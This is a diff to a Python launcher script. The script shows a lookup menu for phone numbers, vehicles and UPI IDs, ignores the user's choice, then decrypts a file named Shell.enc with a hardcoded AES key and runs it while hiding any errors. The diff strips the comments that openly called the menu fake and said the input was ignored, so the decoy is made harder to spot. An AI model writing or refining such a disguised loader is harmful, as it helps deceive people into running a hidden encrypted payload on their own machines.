@@ -1,12 +1,10 @@
-# start.py
 import os
 from base64 import b64decode
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 
-# ---------- CONFIG ----------
 ENC_FILE = "Shell.enc"
-# Paste your key from encryption here:
+
 KEY = b64decode("LrzLae/iO/QTu109CcAgw2Qxuxc+uftJk68cicdVXkU=")  # 32 bytes
 BLOCK_SIZE = AES.block_size
 
@@ -14,13 +12,13 @@ def show_menu():
     from colorama import Fore, Style
     os.system("clear")
     print(Fore.YELLOW + "==================================")
-    print("       🔹 Fake Launcher Menu 🔹")
+    print("              Menu ")
     print("==================================")
     print("1. Number Info")
-    print("2. Car Info")
-    print("3. UPI Info")
+    print("2. vehicle Info")
+    print("3. UPI id Info")
     print("==================================" + Style.RESET_ALL)
-    input(Fore.YELLOW + "Choose any option > " + Style.RESET_ALL)  # user input ignored
+    input(Fore.YELLOW + "Choose any option > " + Style.RESET_ALL)  
 
 def decrypt_and_run():
     with open(ENC_FILE, "rb") as f:
@@ -33,7 +31,7 @@ def decrypt_and_run():
 
 if __name__ == "__main__":
     try:
-        show_menu()        # fake menu
-        decrypt_and_run()  # run Shell.enc
+        show_menu()        
+        decrypt_and_run()  
     except Exception:
-        pass  # silently ignore errors
+        pass  
